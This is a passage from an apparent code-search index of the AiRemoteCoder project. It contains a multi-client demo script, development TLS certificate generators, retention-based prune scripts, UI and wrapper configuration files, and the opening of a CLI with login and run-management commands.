session for UI operations\n  console.log('1. Authenticating...');\n  const session = await getSession();\n  if (!session) {\n    console.error('   Failed to authenticate. Is the gateway running?');\n    console.error(`   Try: cd gateway && npm run dev`);\n    process.exit(1);\n  }\n  console.log('   Authenticated successfully');\n  console.log();\n\n  // Create runs for each client\n  console.log('2. Creating runs for multiple clients...');\n  const runs: RunInfo[] = [];\n\n  for (const client of CLIENTS) {\n    // Create 2 runs per client\n    for (let i = 1; i <= 2; i++) {\n      const run = await createRun(\n        session,\n        `${client.displayName} - Task ${i}`,\n        i === 1 ? 'npm test' : 'npm run build',\n        client.agentId,\n        i === 1 ? 'my-project' : 'api-service'\n      );\n      runs.push({ ...run, clientId: client.agentId, clientName: client.displayName });\n      console.log(`   Created run ${run.id} for ${client.displayName}`);\n    }\n  }\n  console.log();\n\n  // Register clients\n  console.log('3. Registering clients...');\n  for (const client of CLIENTS) {\n    const clientRun = runs.find((r) => r.clientId === client.agentId);\n    if (clientRun) {\n      await registerClient(client, clientRun.id, clientRun.capabilityToken);\n    }\n  }\n  console.log();\n\n  // Start heartbeat for all clients in background\n  console.log('4. Starting heartbeat for clients...');\n  const heartbeatIntervals: NodeJS.Timeout[] = [];\n  for (const client of CLIENTS) {\n    const clientRun = runs.find((r) => r.clientId === client.agentId);\n    if (clientRun) {\n      const interval = setInterval(async () => {\n        try {\n          await sendHeartbeat(client.agentId, clientRun.id, clientRun.capabilityToken);\n        } catch (err) {\n          // Ignore heartbeat errors\n        }\n      }, 15000);\n      heartbeatIntervals.push(interval);\n    }\n  }\n  console.log();\n\n  // Simulate all runs concurrently\n  console.log('5. Streaming logs to all runs (this will take ~30 seconds)...');\n  console.log();\n  console.log('   Open the UI to see the multi-client dashboard:');\n  console.log(`   ${GATEWAY_URL}`);\n  console.log();\n  console.log('   What to test:');\n  console.log('   - Dashboard shows \"Active Runs\" from multiple clients');\n  console.log('   - Runs page filters by client');\n  console.log('   - Clients page shows both clients online');\n  console.log('   - Run detail shows live log streaming');\n  console.log('   - Mobile view (resize browser to 390px width)');\n  console.log();\n\n  // Run all simulations in parallel\n  await Promise.all(\n    runs.map((run, i) => {\n      // Stagger start times slightly\n      return sleep(i * 500).then(() => {\n        console.log(`   Starting simulation for run ${run.id} (${run.clientName})`);\n        return simulateRun(run, LOG_MESSAGES);\n      });\n    })\n  );\n\n  console.log();\n  console.log('6. Simulation complete!');\n  console.log();\n  console.log('   Summary:');\n  console.log(`   - ${CLIENTS.length} clients registered`);\n  console.log(`   - ${runs.length} runs simulated`);\n  console.log();\n\n  // Clean up heartbeat intervals\n  heartbeatIntervals.forEach((interval) => clearInterval(interval));\n\n  // Keep running for a bit so heartbeats can be observed\n  console.log('   Keeping heartbeats alive for 30 more seconds...');\n  console.log('   (Press Ctrl+C to exit)');\n\n  // Re-enable heartbeats for observation\n  for (const client of CLIENTS) {\n    const clientRun = runs.find((r) => r.clientId === client.agentId);\n    if (clientRun) {\n      const interval = setInterval(async () => {\n        try {\n          await sendHeartbeat(client.agentId, clientRun.id, clientRun.capabilityToken);\n        } catch (err) {\n          // Ignore\n        }\n      }, 10000);\n      heartbeatIntervals.push(interval);", "metadata": {"file": "scripts/demo-multi-client.ts", "start_line": 201, "end_line": 400, "language": "ts"}}, {"corpus": "code", "source": "scripts/demo-multi-client.ts", "location": "scripts/demo-multi-client.ts:401", "score": 0.0, "content": "    }\n  }\n\n  await sleep(30000);\n\n  console.log();\n  console.log('Demo complete. Exiting.');\n  heartbeatIntervals.forEach((interval) => clearInterval(interval));\n  process.exit(0);\n}\n\n// Run the demo\nmain().catch((err) => {\n  console.error('Demo failed:', err);\n  process.exit(1);\n});", "metadata": {"file": "scripts/demo-multi-client.ts", "start_line": 401, "end_line": 416, "language": "ts"}}, {"corpus": "code", "source": "scripts/dev-cert.ps1", "location": "scripts/dev-cert.ps1:1", "score": 0.0, "content": "#!/usr/bin/env pwsh\n$ErrorActionPreference = \"Stop\"\n\n$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path\n$ProjectRoot = Split-Path -Parent $ScriptDir\n$CertDir = Join-Path $ProjectRoot \".data\\certs\"\n\nNew-Item -ItemType Directory -Force -Path $CertDir | Out-Null\n\nWrite-Host \"Generating development TLS certificates...\"\n\n# Check if OpenSSL is available\n$openssl = Get-Command openssl -ErrorAction SilentlyContinue\nif (-not $openssl) {\n    Write-Host \"OpenSSL not found. Using PowerShell to generate certificate...\" -ForegroundColor Yellow\n\n    # Use PowerShell's New-SelfSignedCertificate\n    $cert = New-SelfSignedCertificate `\n        -Subject \"CN=localhost\" `\n        -DnsName \"localhost\" `\n        -KeyAlgorithm RSA `\n        -KeyLength 2048 `\n        -NotAfter (Get-Date).AddDays(365) `\n        -CertStoreLocation \"Cert:\\CurrentUser\\My\" `\n        -FriendlyName \"AiRemoteCoder Dev\"\n\n    # Export to PFX\n    $pfxPath = Join-Path $CertDir \"server.pfx\"\n    $password = ConvertTo-SecureString -String \"dev\" -Force -AsPlainText\n    Export-PfxCertificate -Cert $cert -FilePath $pfxPath -Password $password | Out-Null\n\n    # Convert to PEM using openssl if available, otherwise provide instructions\n    Write-Host \"Certificate generated as PFX.\" -ForegroundColor Green\n    Write-Host \"To convert to PEM format, install OpenSSL and run:\" -ForegroundColor Yellow\n    Write-Host \"  openssl pkcs12 -in $pfxPath -out $CertDir\\server.crt -clcerts -nokeys -password pass:dev\"\n    Write-Host \"  openssl pkcs12 -in $pfxPath -out $CertDir\\server.key -nocerts -nodes -password pass:dev\"\n\n} else {\n    # Generate using OpenSSL\n    $keyPath = Join-Path $CertDir \"server.key\"\n    $crtPath = Join-Path $CertDir \"server.crt\"\n\n    # Generate private key\n    openssl genrsa -out $keyPath 2048\n\n    # Generate certificate\n    openssl req -new -x509 `\n        -key $keyPath `\n        -out $crtPath `\n        -days 365 `\n        -subj \"/C=US/ST=Dev/L=Dev/O=AiRemoteCoder/CN=localhost\" `\n        -addext \"subjectAltName=DNS:localhost,IP:127.0.0.1\"\n\n    Write-Host \"Certificates generated:\" -ForegroundColor Green\n    Write-Host \"  Key:  $keyPath\"\n    Write-Host \"  Cert: $crtPath\"\n}\n\nWrite-Host\nWrite-Host \"Note: These are self-signed certificates for development.\" -ForegroundColor Yellow\nWrite-Host \"For production, use certificates from a trusted CA or Let's Encrypt.\"", "metadata": {"file": "scripts/dev-cert.ps1", "start_line": 1, "end_line": 61, "language": "ps1"}}, {"corpus": "code", "source": "scripts/dev-cert.sh", "location": "scripts/dev-cert.sh:1", "score": 0.0, "content": "#!/usr/bin/env bash\nset -euo pipefail\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nPROJECT_ROOT=\"$(dirname \"$SCRIPT_DIR\")\"\nCERT_DIR=\"$PROJECT_ROOT/.data/certs\"\n\nmkdir -p \"$CERT_DIR\"\n\necho \"Generating development TLS certificates...\"\n\n# Generate private key\nopenssl genrsa -out \"$CERT_DIR/server.key\" 2048\n\n# Generate self-signed certificate\nopenssl req -new -x509 \\\n    -key \"$CERT_DIR/server.key\" \\\n    -out \"$CERT_DIR/server.crt\" \\\n    -days 365 \\\n    -subj \"/C=US/ST=Dev/L=Dev/O=AiRemoteCoder/CN=localhost\" \\\n    -addext \"subjectAltName=DNS:localhost,IP:127.0.0.1\"\n\n# Set permissions\nchmod 600 \"$CERT_DIR/server.key\"\nchmod 644 \"$CERT_DIR/server.crt\"\n\necho \"Certificates generated:\"\necho \"  Key:  $CERT_DIR/server.key\"\necho \"  Cert: $CERT_DIR/server.crt\"\necho\necho \"Note: These are self-signed certificates for development.\"\necho \"For production, use certificates from a trusted CA or Let's Encrypt.\"", "metadata": {"file": "scripts/dev-cert.sh", "start_line": 1, "end_line": 32, "language": "sh"}}, {"corpus": "code", "source": "scripts/prune.mjs", "location": "scripts/prune.mjs:1", "score": 0.0, "content": "#!/usr/bin/env node\n/**\n * Prune old runs and artifacts based on retention policy\n */\n\nimport Database from 'better-sqlite3';\nimport { existsSync, rmSync, readdirSync, statSync } from 'fs';\nimport { join, dirname } from 'path';\nimport { fileURLToPath } from 'url';\n\nconst __dirname = dirname(fileURLToPath(import.meta.url));\nconst projectRoot = join(__dirname, '..');\nconst dataDir = join(projectRoot, '.data');\nconst dbPath = join(dataDir, 'db.sqlite');\nconst artifactsDir = join(dataDir, 'artifacts');\nconst runsDir = join(dataDir, 'runs');\n\n// Default retention: 30 days\nconst RETENTION_DAYS = parseInt(process.env.RUN_RETENTION_DAYS || '30', 10);\nconst RETENTION_SECONDS = RETENTION_DAYS * 24 * 60 * 60;\n\nconsole.log(`Pruning runs older than ${RETENTION_DAYS} days...`);\n\nif (!existsSync(dbPath)) {\n  console.log('No database found. Nothing to prune.');\n  process.exit(0);\n}\n\nconst db = new Database(dbPath);\nconst cutoff = Math.floor(Date.now() / 1000) - RETENTION_SECONDS;\n\n// Find old runs\nconst oldRuns = db.prepare(`\n  SELECT id FROM runs\n  WHERE created_at < ? AND status IN ('done', 'failed')\n`).all(cutoff);\n\nconsole.log(`Found ${oldRuns.length} runs to prune`);\n\nlet artifactsDeleted = 0;\nlet filesDeleted = 0;\n\nfor (const run of oldRuns) {\n  console.log(`  Pruning run: ${run.id}`);\n\n  // Get artifacts for this run\n  const artifacts = db.prepare('SELECT path FROM artifacts WHERE run_id = ?').all(run.id);\n\n  // Delete artifact files\n  for (const artifact of artifacts) {\n    if (existsSync(artifact.path)) {\n      try {\n        rmSync(artifact.path);\n        artifactsDeleted++;\n      } catch (err) {\n        console.error(`    Failed to delete: ${artifact.path}`);\n      }\n    }\n  }\n\n  // Delete run directory\n  const runDir = join(runsDir, run.id);\n  if (existsSync(runDir)) {\n    try {\n      rmSync(runDir, { recursive: true });\n    } catch (err) {\n      console.error(`    Failed to delete run dir: ${runDir}`);\n    }\n  }\n\n  // Delete artifact directory\n  const artifactDir = join(artifactsDir, run.id);\n  if (existsSync(artifactDir)) {\n    try {\n      rmSync(artifactDir, { recursive: true });\n    } catch (err) {\n      console.error(`    Failed to delete artifact dir: ${artifactDir}`);\n    }\n  }\n\n  // Delete from database (cascades to events, commands, artifacts)\n  db.prepare('DELETE FROM runs WHERE id = ?').run(run.id);\n}\n\n// Clean up orphaned directories\nfunction cleanOrphanedDirs(baseDir) {\n  if (!existsSync(baseDir)) return 0;\n\n  let cleaned = 0;\n  const entries = readdirSync(baseDir);\n\n  for (const entry of entries) {\n    const path = join(baseDir, entry);\n    if (statSync(path).isDirectory()) {\n      // Check if run exists in database\n      const run = db.prepare('SELECT id FROM runs WHERE id = ?').get(entry);\n      if (!run) {\n        console.log(`  Cleaning orphaned directory: ${entry}`);\n        try {\n          rmSync(path, { recursive: true });\n          cleaned++;\n        } catch (err) {\n          console.error(`    Failed to clean: ${path}`);\n        }\n      }\n    }\n  }\n\n  return cleaned;\n}\n\nconsole.log('Cleaning orphaned directories...');\nfilesDeleted += cleanOrphanedDirs(runsDir);\nfilesDeleted += cleanOrphanedDirs(artifactsDir);\n\n// Clean old nonces\nconst noncesDeleted = db.prepare('DELETE FROM nonces WHERE created_at < ?').run(cutoff - 3600);\nconsole.log(`Cleaned ${noncesDeleted.changes} expired nonces`);\n\n// Clean old sessions\nconst sessionsDeleted = db.prepare('DELETE FROM sessions WHERE expires_at < ?').run(Math.floor(Date.now() / 1000));\nconsole.log(`Cleaned ${sessionsDeleted.changes} expired sessions`);\n\n// Vacuum database\nconsole.log('Vacuuming database...');\ndb.exec('VACUUM');\n\ndb.close();\n\nconsole.log(`\nPrune complete:\n  Runs deleted: ${oldRuns.length}\n  Artifacts deleted: ${artifactsDeleted}\n  Orphaned dirs cleaned: ${filesDeleted}\n`);", "metadata": {"file": "scripts/prune.mjs", "start_line": 1, "end_line": 135, "language": "mjs"}}, {"corpus": "code", "source": "scripts/prune.ps1", "location": "scripts/prune.ps1:1", "score": 0.0, "content": "#!/usr/bin/env pwsh\n<#\n.SYNOPSIS\n    Prune old runs and artifacts based on retention policy\n\n.DESCRIPTION\n    This script removes completed/failed runs older than RUN_RETENTION_DAYS,\n    cleans up associated artifacts, and vacuums the database.\n\n.PARAMETER Days\n    Override the default retention days (from .env or 30)\n#>\n\nparam(\n    [int]$Days = 0\n)\n\n$ErrorActionPreference = \"Stop\"\n\n$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path\n$ProjectRoot = Split-Path -Parent $ScriptDir\n$DataDir = Join-Path $ProjectRoot \".data\"\n$DbPath = Join-Path $DataDir \"db.sqlite\"\n$ArtifactsDir = Join-Path $DataDir \"artifacts\"\n$RunsDir = Join-Path $DataDir \"runs\"\n\n# Load retention days from .env or use default\n$RetentionDays = $Days\nif ($RetentionDays -eq 0) {\n    $envFile = Join-Path $ProjectRoot \".env\"\n    if (Test-Path $envFile) {\n        $envContent = Get-Content $envFile\n        $match = $envContent | Select-String \"RUN_RETENTION_DAYS=(\\d+)\"\n        if ($match) {\n            $RetentionDays = [int]$match.Matches[0].Groups[1].Value\n        }\n    }\n}\nif ($RetentionDays -eq 0) {\n    $RetentionDays = 30\n}\n\nWrite-Host \"Pruning runs older than $RetentionDays days...\" -ForegroundColor Blue\n\nif (-not (Test-Path $DbPath)) {\n    Write-Host \"No database found. Nothing to prune.\" -ForegroundColor Yellow\n    exit 0\n}\n\n# Calculate cutoff timestamp\n$Cutoff = [int][DateTimeOffset]::UtcNow.AddDays(-$RetentionDays).ToUnixTimeSeconds()\n\n# We need sqlite3 CLI for this\n$sqlite = Get-Command sqlite3 -ErrorAction SilentlyContinue\nif (-not $sqlite) {\n    Write-Host \"sqlite3 not found. Please install SQLite CLI tools.\" -ForegroundColor Red\n    Write-Host \"  Windows: winget install SQLite.SQLite\"\n    Write-Host \"  Or run: node scripts/prune.mjs\"\n    exit 1\n}\n\n# Get old runs\n$oldRunsQuery = \"SELECT id FROM runs WHERE created_at < $Cutoff AND status IN ('done', 'failed');\"\n$oldRuns = (sqlite3 $DbPath $oldRunsQuery) -split \"`n\" | Where-Object { $_ }\n\nWrite-Host \"Found $($oldRuns.Count) runs to prune\"\n\n$artifactsDeleted = 0\n$dirsDeleted = 0\n\nforeach ($runId in $oldRuns) {\n    if (-not $runId) { continue }\n\n    Write-Host \"  Pruning run: $runId\"\n\n    # Delete run artifact directory\n    $runArtifactDir = Join-Path $ArtifactsDir $runId\n    if (Test-Path $runArtifactDir) {\n        $files = (Get-ChildItem $runArtifactDir -File).Count\n        Remove-Item $runArtifactDir -Recurse -Force\n        $artifactsDeleted += $files\n        $dirsDeleted++\n    }\n\n    # Delete run logs directory\n    $runLogsDir = Join-Path $RunsDir $runId\n    if (Test-Path $runLogsDir) {\n        Remove-Item $runLogsDir -Recurse -Force\n        $dirsDeleted++\n    }\n\n    # Delete from database\n    sqlite3 $DbPath \"DELETE FROM runs WHERE id = '$runId';\"\n}\n\n# Clean orphaned directories\nWrite-Host \"Cleaning orphaned directories...\"\n\nif (Test-Path $ArtifactsDir) {\n    Get-ChildItem $ArtifactsDir -Directory | ForEach-Object {\n        $exists = sqlite3 $DbPath \"SELECT id FROM runs WHERE id = '$($_.Name)';\"\n        if (-not $exists) {\n            Write-Host \"  Cleaning orphaned: $($_.Name)\"\n            Remove-Item $_.FullName -Recurse -Force\n            $dirsDeleted++\n        }\n    }\n}\n\nif (Test-Path $RunsDir) {\n    Get-ChildItem $RunsDir -Directory | ForEach-Object {\n        $exists = sqlite3 $DbPath \"SELECT id FROM runs WHERE id = '$($_.Name)';\"\n        if (-not $exists) {\n            Write-Host \"  Cleaning orphaned: $($_.Name)\"\n            Remove-Item $_.FullName -Recurse -Force\n            $dirsDeleted++\n        }\n    }\n}\n\n# Clean old nonces\n$noncesCutoff = $Cutoff - 3600\n$noncesResult = sqlite3 $DbPath \"DELETE FROM nonces WHERE created_at < $noncesCutoff; SELECT changes();\"\nWrite-Host \"Cleaned $noncesResult expired nonces\"\n\n# Clean old sessions\n$now = [int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds()\n$sessionsResult = sqlite3 $DbPath \"DELETE FROM sessions WHERE expires_at < $now; SELECT changes();\"\nWrite-Host \"Cleaned $sessionsResult expired sessions\"\n\n# Vacuum database\nWrite-Host \"Vacuuming database...\"\nsqlite3 $DbPath \"VACUUM;\"\n\nWrite-Host\nWrite-Host \"Prune complete:\" -ForegroundColor Green\nWrite-Host \"  Runs deleted: $($oldRuns.Count)\"\nWrite-Host \"  Artifacts deleted: $artifactsDeleted\"\nWrite-Host \"  Directories cleaned: $dirsDeleted\"", "metadata": {"file": "scripts/prune.ps1", "start_line": 1, "end_line": 139, "language": "ps1"}}, {"corpus": "code", "source": "ui/index.html", "location": "ui/index.html:1", "score": 0.0, "content": "<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\" />\n    <meta name=\"theme-color\" content=\"#1a1a2e\" />\n    <meta name=\"description\" content=\"Claude Code Remote Monitor\" />\n    <title>Claude Code Monitor</title>\n    <link rel=\"icon\" type=\"image/svg+xml\" href=\"/icon.svg\" />\n  </head>\n  <body>\n    <div id=\"root\"></div>\n    <script type=\"module\" src=\"/src/main.tsx\"></script>\n  </body>\n</html>", "metadata": {"file": "ui/index.html", "start_line": 1, "end_line": 15, "language": "html"}}, {"corpus": "code", "source": "ui/package.json", "location": "ui/package.json:1", "score": 0.0, "content": "{\n  \"name\": \"@ai-remote-coder/ui\",\n  \"version\": \"1.0.0\",\n  \"type\": \"module\",\n  \"scripts\": {\n    \"dev\": \"vite\",\n    \"build\": \"tsc && vite build\",\n    \"preview\": \"vite preview\"\n  },\n  \"dependencies\": {\n    \"react\": \"^18.2.0\",\n    \"react-dom\": \"^18.2.0\",\n    \"react-router-dom\": \"^6.21.1\"\n  },\n  \"devDependencies\": {\n    \"@types/react\": \"^18.2.46\",\n    \"@types/react-dom\": \"^18.2.18\",\n    \"@vitejs/plugin-react\": \"^4.2.1\",\n    \"typescript\": \"^5.3.3\",\n    \"vite\": \"^5.0.10\"\n  }\n}", "metadata": {"file": "ui/package.json", "start_line": 1, "end_line": 22, "language": "json"}}, {"corpus": "code", "source": "ui/tsconfig.json", "location": "ui/tsconfig.json:1", "score": 0.0, "content": "{\n  \"compilerOptions\": {\n    \"target\": \"ES2020\",\n    \"useDefineForClassFields\": true,\n    \"lib\": [\"ES2020\", \"DOM\", \"DOM.Iterable\"],\n    \"module\": \"ESNext\",\n    \"skipLibCheck\": true,\n    \"moduleResolution\": \"bundler\",\n    \"allowImportingTsExtensions\": true,\n    \"resolveJsonModule\": true,\n    \"isolatedModules\": true,\n    \"noEmit\": true,\n    \"jsx\": \"react-jsx\",\n    \"strict\": true,\n    \"noUnusedLocals\": true,\n    \"noUnusedParameters\": true,\n    \"noFallthroughCasesInSwitch\": true\n  },\n  \"include\": [\"src\"],\n  \"references\": [{ \"path\": \"./tsconfig.node.json\" }]\n}", "metadata": {"file": "ui/tsconfig.json", "start_line": 1, "end_line": 21, "language": "json"}}, {"corpus": "code", "source": "ui/tsconfig.node.json", "location": "ui/tsconfig.node.json:1", "score": 0.0, "content": "{\n  \"compilerOptions\": {\n    \"composite\": true,\n    \"skipLibCheck\": true,\n    \"module\": \"ESNext\",\n    \"moduleResolution\": \"bundler\",\n    \"allowSyntheticDefaultImports\": true,\n    \"strict\": true\n  },\n  \"include\": [\"vite.config.ts\"]\n}", "metadata": {"file": "ui/tsconfig.node.json", "start_line": 1, "end_line": 11, "language": "json"}}, {"corpus": "code", "source": "ui/vite.config.ts", "location": "ui/vite.config.ts:1", "score": 0.0, "content": "import { defineConfig } from 'vite';\nimport react from '@vitejs/plugin-react';\n\nexport default defineConfig({\n  plugins: [react()],\n  server: {\n    port: 3000,\n    proxy: {\n      '/api': {\n        target: 'https://localhost:3100',\n        changeOrigin: true,\n        secure: false\n      },\n      '/ws': {\n        target: 'wss://localhost:3100',\n        ws: true,\n        secure: false\n      }\n    }\n  },\n  build: {\n    outDir: 'dist',\n    sourcemap: true\n  }\n});", "metadata": {"file": "ui/vite.config.ts", "start_line": 1, "end_line": 25, "language": "ts"}}, {"corpus": "code", "source": "wrapper/package.json", "location": "wrapper/package.json:1", "score": 0.0, "content": "{\n  \"name\": \"@ai-remote-coder/wrapper\",\n  \"version\": \"1.1.0\",\n  \"type\": \"module\",\n  \"main\": \"dist/index.js\",\n  \"bin\": {\n    \"ai-runner\": \"./dist/cli.js\"\n  },\n  \"scripts\": {\n    \"dev\": \"tsx src/cli.ts\",\n    \"build\": \"tsc\",\n    \"start\": \"node dist/cli.js\",\n    \"test\": \"vitest run\",\n    \"test:watch\": \"vitest\"\n  },\n  \"dependencies\": {\n    \"commander\": \"^11.1.0\",\n    \"dotenv\": \"^16.3.1\",\n    \"form-data\": \"^4.0.0\",\n    \"nanoid\": \"^5.0.4\",\n    \"node-fetch\": \"^3.3.2\",\n    \"ws\": \"^8.16.0\"\n  },\n  \"devDependencies\": {\n    \"@types/node\": \"^20.10.6\",\n    \"@types/ws\": \"^8.5.10\",\n    \"tsx\": \"^4.7.0\",\n    \"typescript\": \"^5.3.3\",\n    \"vitest\": \"^1.1.3\"\n  }\n}", "metadata": {"file": "wrapper/package.json", "start_line": 1, "end_line": 31, "language": "json"}}, {"corpus": "code", "source": "wrapper/tsconfig.json", "location": "wrapper/tsconfig.json:1", "score": 0.0, "content": "{\n  \"compilerOptions\": {\n    \"target\": \"ES2022\",\n    \"module\": \"ESNext\",\n    \"moduleResolution\": \"bundler\",\n    \"lib\": [\"ES2022\"],\n    \"outDir\": \"dist\",\n    \"rootDir\": \"src\",\n    \"strict\": true,\n    \"esModuleInterop\": true,\n    \"skipLibCheck\": true,\n    \"forceConsistentCasingInFileNames\": true,\n    \"declaration\": true,\n    \"sourceMap\": true,\n    \"resolveJsonModule\": true\n  },\n  \"include\": [\"src/**/*\"],\n  \"exclude\": [\"node_modules\", \"dist\"]\n}", "metadata": {"file": "wrapper/tsconfig.json", "start_line": 1, "end_line": 19, "language": "json"}}, {"corpus": "code", "source": "wrapper/vitest.config.ts", "location": "wrapper/vitest.config.ts:1", "score": 0.0, "content": "import { defineConfig } from 'vitest/config';\n\nexport default defineConfig({\n  test: {\n    globals: true,\n    environment: 'node',\n    include: ['src/**/*.test.ts']\n  }\n});", "metadata": {"file": "wrapper/vitest.config.ts", "start_line": 1, "end_line": 9, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/cli.ts", "location": "wrapper/src/cli.ts:1", "score": 0.0, "content": "#!/usr/bin/env node\n\nimport { Command } from 'commander';\nimport { existsSync, readFileSync, writeFileSync, mkdirSync } from 'fs';\nimport { join, dirname } from 'path';\nimport { fileURLToPath } from 'url';\nimport { config, validateConfig } from './config.js';\nimport { ClaudeRunner } from './services/claude-runner.js';\nimport { GenericRunner, createGenericRunner } from './services/generic-runner.js';\nimport {\n  testConnection,\n  login,\n  getAuthStatus,\n  listRuns,\n  getRun,\n  getRunState,\n  createRun,\n  stopRun,\n  haltRun,\n  restartRun,\n  sendInput,\n  sendEscape,\n  type UIAuth\n} from './services/gateway-client.js';\nimport { type WorkerType, getWorkerDisplayName, isValidWorkerType } from './services/worker-registry.js';\nimport type { BaseRunner } from './services/base-runner.js';\n\nconst program = new Command();\n\n// Read version from package.json\nfunction getVersion(): string {\n  try {\n    const __dirname = dirname(fileURLToPath(import.meta.url));\n    const packageJsonPath = join(__dirname, '..', 'package.json');\n    const packageJson = JSON.parse(readFileSync(packageJsonPath, 'utf8')) as { version?: string };\n    return packageJson.version || '1.0.0';\n  } catch {\n    return '1.0.0'; // Fallback version\n  }\n}\n\n// Credential storage path\nconst credentialsPath = join(config.dataDir, 'credentials.json');\n\ninterface StoredCredentials {\n  sessionToken: string;\n  username: string;\n  role: string;\n  expiresAt: number;\n}\n\n/**\n * Load stored credentials\n */\nfunction loadCredentials(): StoredCredentials | null {\n  try {\n    if (existsSync(credentialsPath)) {\n      const data = JSON.parse(readFileSync(credentialsPath, 'utf8'));\n      // Check if expired (24 hours)\n      if (data.expiresAt && data.expiresAt > Date.now()) {\n        return data;\n      }\n    }\n  } catch (err) {\n    // Ignore errors\n  }\n  return null;\n}\n\n/**\n * Save credentials\n */\nfunction saveCredentials(creds: StoredCredentials): void {\n  try {\n    const dir = dirname(credentialsPath);\n    if (!existsSync(dir)) {\n      mkdirSync(dir, { recursive: true });\n    }\n    writeFileSync(credentialsPath, JSON.stringify(creds, null, 2), { mode: 0o600 });\n  } catch (err) {\n    console.error('Warning: Could not save credentials:', err);\n  }\n}\n\n/**\n * Clear stored credentials\n */\nfunction clearCredentials(): void {\n  try {\n    if (existsSync(credentialsPath)) {\n      writeFileSync(credentialsPath, '{}');\n    }\n  } catch (err) {\n    // Ignore errors\n  }\n}\n\n/**\n * Get UI auth, prompting for login if needed\n */\nasync function getUIAuth(): Promise<UIAuth> {\n  const creds = loadCredentials();\n  if (creds?.sessionToken) {\n    return { sessionToken: creds.sessionToken };\n  }\n\n  console.error('Not logged in. Use \"claude-runner login\" first.');\n  process.exit(1);\n}\n\n/**\n * Format timestamp for display\n */\nfunction formatTime(timestamp: number | null): string {\n  if (!timestamp) return '-';\n  return new Date(timestamp * 1000).toLocaleString();\n}\n\n/**\n * Format duration\n */\nfunction formatDuration(start: number | null, end: number | null): string {\n  if (!start) return '-';\n  const endTime = end || Math.floor(Date.now() / 1000);\n  const seconds = endTime - start;\n  if (seconds < 60) return `${seconds}s`;\n  if (seconds < 3600) return `${Math.floor(seconds / 60)}m ${seconds % 60}s`;\n  return `${Math.floor(seconds / 3600)}h ${Math.floor((seconds % 3600) / 60)}m`;\n}\n\n/**\n * Status color/symbol\n */\nfunction statusDisplay(status: string): string {\n  switch (status) {\n    case 'pending': return '\u23f3 pending';\n    case 'running': return '\ud83d\udd04 running';\n    case 'done': return '\u2713 done';\n    case 'failed': return '\u2717 failed';\n    default: return status;\n  }\n}\n\nprogram\n  .name('ai-runner')\n  .description('AI Remote Coder wrapper for Connect-Back Gateway - Full workflow control')\n  .version(getVersion());\n\n// ============================================================================\n// Authentication Commands\n// ============================================================================\n\nprogram\n  .command('login')\n  .description('Login to the gateway')\n  .option('-u, --username <username>', 'Username')\n  .option('-p, --password <password>', 'Password')\n  .option('-t, --totp <code>', 'TOTP code (if 2FA enabled)')\n  .action(async (options) => {\n    try {\n      const status = await getAuthStatus();\n      if (status.needsSetup) {\n        console.error('Gateway needs initial setup. Visit the web UI first to create admin account.');\n        process.exit(1);\n      }\n\n      // Prompt for credentials if not provided\n      let username = options.username;\n      let password = options.password;\n\n      if (!username) {\n        const readline = await import('readline');\n        const rl = readline.createInterface({\n          input: process.stdin,\n          output: process.stdout\n        });\n        username = await new Promise<string>(resolve => {\n          rl.question('Username: ', resolve);\n        });\n        rl.close();\n      }\n\n      if (!password) {\n        const readline = await import('readline');\n        const rl = readline.createInterface({\n          input: process.stdin,\n          output: process.stdout\n        });\n        // Hide password input\n        process.stdout.write('Password: ');\n        password = await new Promise<string>(resolve => {\n          let pwd = '';\n          process.stdin.setRawMode?.(true);\n          process.stdin.resume();\n          process.stdin.on('data', (char) => {\n            const c = char.toString();\n            if (c === '\\n' || c === '\\r') {\n              process.stdin.setRawMode?.(false);\n              console.log();\n              resolve(pwd);", "metadata": {"file": "wrapper/src/cli.ts", "start_line": 1, "end_line": 200, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/cli.ts", "location": "wrapper/src/cli.ts:201", "score": 0.0, "content": "            } else if (c === '\\u0003') {\n              process.exit();\n            } else if (c === '\\u007F') {\n              pwd = pwd.slice(0, -1);\n            } else {\n              pwd += c;\n            }\n          });\n        });\n        rl.close();\n      }\n\n      const result = await login(username, password, options.totp);\n\n      // Save credentials\n      saveCredentials({\n        sessionToken: result.token,\n        username: result.user.username,\n        role: result.user.role,\n        expiresAt: Date.now() + 24 * 60 * 60 * 1000 // 24 hours\n      });\n\n      console.log(`\u2713 Logged in as ${result.user.username} (${result.user.role})`);\n    } catch (err: any) {\n      console.error('Login failed:', err.message);\n      process.exit(1);\n    }\n  });\n\nprogram\n  .command('logout')\n  .description('Logout and clear stored credentials')\n  .action(() => {\n    clearCredentials();\n    console.log('\u2713 Logged out');\n  });\n\nprogram\n  .command('whoami')\n  .description('Show current logged in user')\n  .action(() => {\n    const creds = loadCredentials();\n    if (creds?.sessionToken) {\n      console.log(`Logged in as: ${creds.username} (${creds.role})`);\n      console.log(`Session expires: ${new Date(creds.expiresAt).toLocaleString()}`);\n    } else {\n      console.log('Not logged in');\n    }\n  });\n\n// ============================================================================\n// Session Management Commands\n// ============================================================================\n\nprogram\n  .command('list')\n  .alias('ls')\n  .description('List all runs/sessions')\n  .option('-s, --status <status>', 'Filter by status (pending, running, done, failed)')\n  .option('-l, --limit <n>', 'Number of results', '20')\n  .option('-o, --offset <n>', 'Offset for pagination', '0')\n  .option('-q, --search <query>', 'Search by command or run ID')\n  .option('--json', 'Output as JSON')\n  .action(async (options) => {\n    try {\n      const auth = await getUIAuth();\n      const result = await listRuns(auth, {\n        status: options.status,\n        limit: parseInt(options.limit, 10),\n        offset: parseInt(options.offset, 10),\n        search: options.search\n      });\n\n      if (options.json) {\n        console.log(JSON.stringify(result, null, 2));\n        return;\n      }\n\n      if (result.runs.length === 0) {\n        console.log('No runs found');\n        return;\n      }\n\n      console.log(`\\nRuns (${result.pagination.offset + 1}-${result.pagination.offset + result.runs.length} of ${result.pagination.total}):\\n`);\n      console.log('ID            Status       Duration   Command');\n      console.log('\u2500'.repeat(70));\n\n      for (const run of result.runs) {\n        const duration = formatDuration(run.started_at, run.finished_at);\n        const command = run.command?.substring(0, 30) || '(no 